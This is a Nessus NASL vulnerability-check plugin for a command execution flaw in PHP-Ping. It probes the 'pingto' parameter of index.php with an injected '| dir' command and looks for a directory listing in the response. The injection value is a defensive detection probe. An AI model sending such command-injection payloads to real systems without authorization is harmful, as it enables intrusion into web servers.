#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

# Ref:
# Message-ID: <003d01c2e3d7$8ef3eea0$0300a8c0@goliath>
# From: "Gregory Le Bras | Security Corporation" <gregory.lebras@security-corp.org>
# To: <vulnwatch@vulnwatch.org>
# Subject: [VulnWatch] [SCSA-009] Remote Command Execution Vulnerability in PHP Ping
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(11324);
  script_version("1.18");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_name(english:"PHP-Ping index.php pingto Parameter Arbitrary Code Execution");

  script_set_attribute(attribute:"synopsis", value:
"Arbitrary commands may be run on the remote host.");
  script_set_attribute(attribute:"description", value:
"It is possible to make the remote host execute arbitrary DOS commands
using the CGI phpping.

An attacker may use this flaw to gain a shell with the privileges of the 
web server.");
  script_set_attribute(attribute:"solution", value:
"See http://www.nessus.org/u?1ed5dd75 or 
contact the vendor for a patch");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_set_attribute(attribute:"plugin_publication_date", value:"2003/03/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:theworldsend.net:php-ping");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2003-2022 Tenable Network Security, Inc.");

  script_dependencies("webmirror.nasl", "http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port))exit(0);



function check(loc)
{
 local_var r;

 r = http_send_recv3(item: strcat(loc, "/index.php?pingto=www.nessus.org%20|%20dir"), method: "GET", port:port);			
 if (isnull(r)) exit(0);
 if(egrep(pattern:"<DIR>", string:strcat(r[0], r[1],r[2])))
 {
 	security_hole(port);
	exit(0);
 }
}


dir = make_list(cgi_dirs());
dirs = make_list();
foreach d (dir)
 dirs = make_list(dirs, string(d, "/phpping"));

dirs = make_list(dirs, "", "/phpping");



foreach dir (dirs)
{
 check(loc:dir);
}
